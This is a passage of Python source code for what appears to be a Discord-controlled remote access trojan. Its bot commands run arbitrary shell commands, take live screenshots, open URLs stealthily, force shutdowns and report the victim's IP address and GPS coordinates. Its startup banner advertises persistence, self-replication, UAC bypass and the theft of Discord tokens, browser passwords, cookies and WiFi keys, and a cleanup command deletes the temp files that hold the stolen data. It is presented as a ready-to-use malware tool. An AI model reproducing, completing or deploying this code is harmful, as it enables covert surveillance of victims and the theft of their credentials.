    result = execute_command(cmd)
    await ctx.send(result)

@bot.command(name='screenshot')
async def screenshot_command(ctx, count: str = "1"):
    global is_capturing, is_live_mode
    
    if is_capturing or is_live_mode:
        await ctx.send("Screenshot capture is already running! Use `$stop` to stop it.")
        return
    
    try:
        num_screenshots = int(count)
        if num_screenshots < 1 or num_screenshots > 100:
            await ctx.send("Please enter a number between 1 and 100")
            return
    except ValueError:
        await ctx.send("Invalid number")
        return
    
    await ctx.send(f"Starting screenshot capture ({num_screenshots} screenshots)...")
    asyncio.create_task(capture_screenshots_task(ctx, num_screenshots))

@bot.command(name='live')
async def live_command(ctx):
    global is_capturing, is_live_mode, stop_capture
    
    if is_capturing or is_live_mode:
        await ctx.send("Screenshot capture or live mode is already running! Use `$stop` to stop it.")
        return
    
    is_live_mode = True
    stop_capture = False
    
    await ctx.send("Starting live screenshot mode!\nScreenshots every 10 seconds.\nUse `$stop` to stop.")
    
    asyncio.create_task(live_screenshot_task(ctx))

@bot.command(name='stop')
async def stop_command(ctx):
    global stop_capture, is_live_mode
    
    if is_capturing or is_live_mode:
        stop_capture = True
        if is_live_mode:
            is_live_mode = False
            await ctx.send("Stopping live screenshot mode...")
        else:
            await ctx.send("Stopping screenshot capture...")
    else:
        await ctx.send("No screenshot capture or live mode is currently running.")

@bot.command(name='audio')
async def audio_command(ctx, *args):
    if not args:
        await ctx.send("Usage: `$audio <text>`\n\nExample: `$audio Hello world`")
        return
    
    text = ' '.join(args)
    
    if len(text) > 500:
        await ctx.send("❌ Text too long! Maximum 500 characters.")
        return
    
    await ctx.send(f"Speaking: `{text[:100]}{'...' if len(text) > 100 else ''}`")
    
    success = speak_text(text)
    
    if success:
        await ctx.send("Audio played successfully!")
    else:
        await ctx.send("Audio played with errors.")

@bot.command(name='url')
async def url_command(ctx, *args):
    if not args:
        await ctx.send(
            "Usage: `$url <link>`\n\n"
            "Examples:\n"
            "• `$url https://google.com` - Open Google\n"
            "• `$url youtube.com` - Open YouTube\n"
            "• `$url stealth twitter.com` - Open Twitter minimized"
        )
        return
    
    stealth_mode = False
    url_parts = list(args)
    
    if url_parts[0].lower() == 'stealth':
        stealth_mode = True
        url_parts.pop(0)
    
    if not url_parts:
        await ctx.send("Please provide a URL after 'stealth'")
        return
    
    url = ' '.join(url_parts)
    
    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.scheme and not parsed.netloc:
            if '.' in url and ' ' not in url:
                url = 'https://' + url
            else:
                await ctx.send("Invalid URL format.\nExample: `$url google.com`")
                return
    except:
        pass
    
    await ctx.send(f"Opening URL: `{url}`\n{'Stealth mode: Enabled' if stealth_mode else ''}")
    
    try:
        if stealth_mode:
            success, message = open_url_stealthy(url)
        else:
            success, message = open_url_in_browser(url)
        
        if success:
            await ctx.send(f"{message}")
        else:
            await ctx.send(f"{message}")
            
    except Exception as e:
        await ctx.send(f"❌ Error opening URL: `{str(e)[:100]}`")

@bot.command(name='shutdown')
async def shutdown_command(ctx, *args):
    delay = 60
    force = True
    
    for arg in args:
        if arg.isdigit():
            delay = int(arg)
        elif arg in ["normal", "soft"]:
            force = False
        elif arg in ["force", "hard"]:
            force = True
        elif arg in ["now", "immediate"]:
            delay = 0
    
    if delay < 0 or delay > 3600:
        await ctx.send("Delay must be between 0 and 3600 seconds")
        return
    
    await shutdown_pc(ctx, delay_seconds=delay, force=force)

@bot.command(name='restart')
async def restart_command(ctx, *args):
    delay = 60
    force = True
    
    for arg in args:
        if arg.isdigit():
            delay = int(arg)
        elif arg in ["normal", "soft"]:
            force = False
        elif arg in ["force", "hard"]:
            force = True
        elif arg in ["now", "immediate"]:
            delay = 0
    
    if delay < 0 or delay > 3600:
        await ctx.send("Delay must be between 0 and 3600 seconds")
        return
    
    await restart_pc(ctx, delay_seconds=delay, force=force)

@bot.command(name='cancel')
async def cancel_command(ctx):
    await cancel_shutdown_restart(ctx)

@bot.command(name='shutdownstatus')
async def shutdownstatus_command(ctx):
    status_text = []
    if shutdown_pending:
        status_text.append("Shutdown: Scheduled")
    else:
        status_text.append("Shutdown: Not scheduled")
    
    if restart_pending:
        status_text.append("Restart: Scheduled")
    else:
        status_text.append("Restart: Not scheduled")
    
    await ctx.send("\n".join(status_text))

@bot.command(name='countdown')
async def countdown_command(ctx, seconds: str = None):
    global countdown_active
    
    if countdown_active:
        await ctx.send("Countdown is already running! Use `$countstop` to stop it.")
        return
    
    if not seconds:
        await ctx.send("Usage: `$countdown <seconds>`")
        return
    
    try:
        seconds_int = int(seconds)
        if seconds_int <= 0 or seconds_int > 3600:
            await ctx.send("Please enter a number between 1 and 3600")
            return
    except ValueError:
        await ctx.send("Invalid number")
        return
    
    asyncio.create_task(countdown_task(ctx, seconds_int))

@bot.command(name='countstop')
async def countstop_command(ctx):
    global stop_countdown
    
    if countdown_active:
        stop_countdown = True
        await ctx.send("Stopping countdown...")
    else:
        await ctx.send("No countdown is currently running.")

@bot.command(name='cleanup')
async def cleanup_command(ctx):
    try:
        temp_dir = tempfile.gettempdir()
        count = 0
        for filename in os.listdir(temp_dir):
            if filename.startswith("screenshot_") or filename.startswith("live_screenshot_") or filename.startswith("all_files_") or filename.startswith("tokens_") or filename.startswith("passwords_") or filename.startswith("social_") or filename.startswith("history_") or filename.startswith("cookies_"):
                try:
                    os.remove(os.path.join(temp_dir, filename))
                    count += 1
                except:
                    pass
        
        await ctx.send(f"Cleaned up {count} temporary files.")
    except Exception as e:
        await ctx.send(f"❌ Error during cleanup: {str(e)}")

@bot.command(name='location')
async def location_command(ctx):
    await ctx.send("Fetching device location...")
    
    current_user = next((u for u in user_system.registered_users if u['id'] == user_system.current_user_id), None)
    if current_user:
        location = current_user['location']
    else:
        location = user_system.get_accurate_location()
    
    if 'error' in location:
        await ctx.send(f"❌ Error getting location: {location['error']}")
        return
    
    loc_info = []
    if 'ip' in location:
        loc_info.append(f"Public IP: `{location['ip']}`")
    loc_info.append(f"Private IP: `{get_private_ip()}`")
    if 'city' in location:
        loc_info.append(f"City: {location['city']}")
    if 'region' in location:
        loc_info.append(f"Region: {location['region']}")
    if 'country' in location:
        loc_info.append(f"Country: {location['country']}")
    if 'lat' in location and 'lon' in location and location['lat'] != 0:
        loc_info.append(f"Coordinates: {location['lat']:.6f}, {location['lon']:.6f}")
        maps_link = f"\nGoogle Maps: https://www.google.com/maps?q={location['lat']},{location['lon']}"
    else:
        maps_link = ""
    
    embed = discord.Embed(
        title="Device Location Information",
        description="\n".join(loc_info) + maps_link,
        color=0x00ff00,
        timestamp=datetime.datetime.now(datetime.timezone.utc)
    )
    
    await ctx.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"Command not found! Use `{COMMAND_PREFIX}help` to see available commands.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"Missing argument! Use `{COMMAND_PREFIX}help {ctx.command}` for usage.")
    elif isinstance(error, commands.BadArgument):
        await ctx.send(f"Invalid argument! Use `{COMMAND_PREFIX}help {ctx.command}` for usage.")
    else:
        await ctx.send(f"❌ Error executing command: `{str(error)[:100]}`")

def run_bot():
    print("\n" + "=" * 60)
    print("ENHANCED DISCORD BOT WITH ALL FEATURES")
    print("=" * 60)
    
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: You need to set your bot token!")
        print("\nINSTRUCTIONS:")
        print("1. Go to: https://discord.com/developers/applications")
        print("2. Click 'New Application' and name it")
        print("3. Go to 'Bot' section")
        print("4. Click 'Reset Token' and copy it")
        print("5. Paste your token in the code (line ~180)")
        print("   Replace: BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'")
        print("\nEnable these Privileged Gateway Intents:")
        print("   - MESSAGE CONTENT INTENT")
        print("   - SERVER MEMBERS INTENT (optional)")
        print("\nFeatures included:")
        print("   • Advanced stealth & persistence")
        print("   • Self-replicating payload")
        print("   • User system with device fingerprinting")
        print("   • Discord token stealing (all browsers)")
        print("   • Password stealing (Chrome, Edge, Brave, Opera)")
        print("   • WiFi password extraction")
        print("   • Social media credential filtering")
        print("   • Cookie stealing")
        print("   • Browser history extraction")
        print("   • Admin privilege detection and elevation")
        print("   • PowerShell with admin commands")
        print("   • UAC bypass capabilities")
        print("   • Screenshot capture (single & live mode)")
        print("   • File system access & downloads")
        print("   • System monitoring (CPU, RAM, Disk, Network)")
        print("   • Power control (shutdown, restart)")
        print("   • Audio TTS control")
        print("   • URL opening (stealth mode available)")
        print("   • Command execution")
        print("   • Location tracking with maps")
        print("   • Process and network monitoring")
        print("   • Webhook notifications for device registration")
        print("   • Interactive dropdown help menu")
        print("=" * 60)
        input("Press Enter to exit...")
        return
    
    try:
        print("Starting bot...")
        bot.run(BOT_TOKEN)
    except discord.LoginFailure:
        print("Invalid bot token! Please check your token.")
        print("Make sure you copied it correctly and didn't include spaces.")
    except Exception as e:
        print(f"Error: {type(e).__name__}: {e}")
        input("Press Enter to exit...")

if __name__ == "__main__":
    run_bot()
